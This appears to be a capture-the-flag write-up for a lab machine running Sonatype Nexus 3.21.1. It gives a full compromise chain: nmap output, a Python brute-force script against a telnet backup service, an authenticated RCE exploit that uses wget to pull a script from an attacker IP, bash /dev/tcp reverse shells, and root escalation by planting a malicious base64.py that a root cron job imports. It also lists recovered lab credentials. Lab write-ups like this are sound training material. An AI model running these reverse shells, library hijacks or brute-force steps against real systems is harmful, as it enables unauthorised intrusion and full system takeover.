
# Export
```md
export IP="192.168.68.159"
export URL="http://192.168.68.159:80/FUZZ"
```

<hr>

# RCE
+ Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated) 
```bash
$ searchsploit sonatype
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)                                                                                                                    | java/webapps/49385.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

+ Modify code:

```bash
#CMD='wget 192.168.49.68:80/cmback.sh'
#CMD='bash cmback.sh'
```

+ Content of `cmback.sh`

```bash
$ cat cmback.sh 
bash -c "bash -i >& /dev/tcp/192.168.49.68/8081 0>&1"
```

+ Reverse shell

```bash
$ sudo nc -nlvp 8081
Listening on 0.0.0.0 8081
Connection received on 192.168.68.159 42742
bash: cannot set terminal process group (955): Inappropriate ioctl for device
bash: no job control in this shell
nexus@sona:~/nexus-3.21.1-01$
```

<hr>

# Local Enumeration
+ Check `/etc/passwd` file.

```bash
nexus@sona:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
nexus:x:1000:1000::/home/nexus:/bin/sh
sona:x:1001:1001::/home/sona:/bin/sh  
```

+ Running socket.
```bash
nexus@sona:/home/sona$ ss -anlt
State                    Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                   Process                   
LISTEN                   0                        1                                              127.0.0.1:40841                                          0.0.0.0:*                                                
LISTEN                   0                        50                                               0.0.0.0:8081                                           0.0.0.0:*                                                
```

+ Plaintext password?

```bash
nexus@sona:/dev/shm$ cat /home/nexus/nexus-3.21.1-01/system/users.xml
<users>
<id>1001</id>
<username>sona</username>
<password>KuramaThe9</password>
</users>
```

+ `sona` home directory

```bash
sona@sona:~$ ls -al
total 40
drwxrwxrw- 3 sona sona 4096 Aug 25 09:04 .
drwxr-xr-x 4 root root 4096 Feb 10  2021 ..
lrwxrwxrwx 1 root root    9 Feb 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 sona sona  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sona sona 3771 Feb 25  2020 .bashrc
-r--r--r-- 1 sona sona   33 Aug 25 06:30 local.txt
-r-xr----- 1 root sona  210 Feb 10  2021 logcrypt.py
-rw-r--r-- 1 sona sona  807 Feb 25  2020 .profile
drwxr-xr-x 2 root root 4096 Aug 25 09:04 __pycache__
-rw------- 1 sona sona 2481 Aug 25 09:04 .viminfo
```

+ `~/logcrypt.py`

```bash
sona@sona:~$ cat logcrypt.py 
#!/usr/bin/python3

import base64

log_file = open('/var/log/auth.log','rb')
crypt_data = base64.b64encode(log_file.read())
cryptlog_file = open('/tmp/log.crypt','wb')
cryptlog_file.write(crypt_data)
```

+ Is crontab running?

```bash
sona@sona:~$ ls -al /tmp/log.crypt
-rw-r--r-- 1 root root 49820 Aug 25 08:55 /tmp/log.crypt
sona@sona:~$ date
Wed 25 Aug 2021 08:56:01 AM UTC
```

+ Malicious `base64.py`

```bash
sona@sona:~$ chmod 776 .
sona@sona:~$ nano base64.py 
#!/usr/bin/python3

import os

def b64encode(arg):
    os.system("bash -c 'bash -i >& /dev/tcp/192.168.49.68/23 0>&1'")
```

+ Root revere shell

```bash
$ sudo nc -nlvp 23
Listening on 0.0.0.0 23
Connection received on 192.168.68.159 45534
bash: cannot set terminal process group (44844): Inappropriate ioctl for device
bash: no job control in this shell
root@sona:~# id    
id
uid=0(root) gid=0(root) groups=0(root)
```

<hr>

# Credentials
→ (Nexus Backup Manager): `blackleo`
→ (Web app): `admin:3e409e89-514c-4f9f-955e-dfa5c4083518`
→ (Local user): `sona:KuramaThe9`

<hr>

# Nmap

```bash
root@kali:~/sona# nmap -sV -sC --open 192.168.59.159 -oA nmap/services

PORT     STATE SERVICE REASON         VERSION
23/tcp   open  telnet? syn-ack ttl 64
8081/tcp open  http    syn-ack ttl 64 Jetty 9.4.18.v20190429
|_http-favicon: Unknown favicon MD5: 9A008BECDE9C5F250EDAD4F00E567721
| http-methods: 
|_  Supported Methods: GET HEAD
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
|_http-server-header: Nexus/3.21.1-01 (OSS)
|_http-title: Nexus Repository Manager
```

<hr>

# HTTP
+ `robots.txt`

```md
Disallow: /repository/
Disallow: /service/
```

+ Application → `Nexus/3.21.1-01`  → Authenticated RCE 
+ Custom password brute force script:

<hr>

# Telnet
+ Telnet's running recovery `backup`.
```bash
$ telnet 192.168.68.159 23
Trying 192.168.68.159...
Connected to 192.168.68.159.
Escape character is '^]'.
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
ANSONE
Please Enter Answer
ANSONE <answer>
test
Incorrect
Connection closed by foreign host.
```


+ Brute force script

```py
#!/usr/bin/env python3
import socket
import sys
from time import sleep

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 23
IP = "192.168.68.159"
pwd_f = sys.argv[1]

with open(pwd_f, 'r', encoding='ISO-8859-1') as pwds:
    pwds_read = pwds.readlines()
    for pwd in pwds_read:
        pwd = pwd.strip()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((IP, port))
            s.recv(1024)
            s.recv(1024)
            try:
                print(f"Trying password: {pwd}")
                option = "ANSONE"
                s.send(bytes(option, "latin-1"))
                s.recv(1024)
                sleep(1)
                s.send(bytes(pwd, "latin-1"))
                d = s.recv(2048)
                if not "Incorrect" in d.decode():
                    print(f"Found!: {pwd}")
                    break
                else:
                    pass
            except:
                pass
```


+ Brute force `ANSONE` → `leo`

```bash
$ python3 ansone.py sign.txt 
Trying password: aries
[...]
Found!: leo
```

+ Brute force `ANSTWO` → `black`

```bash
$ python3 anstwo.py colors-list.txt 
Trying password: alizarin
[...]
Found!: black
```

+ Guessing `RECOVER` → `blackleo`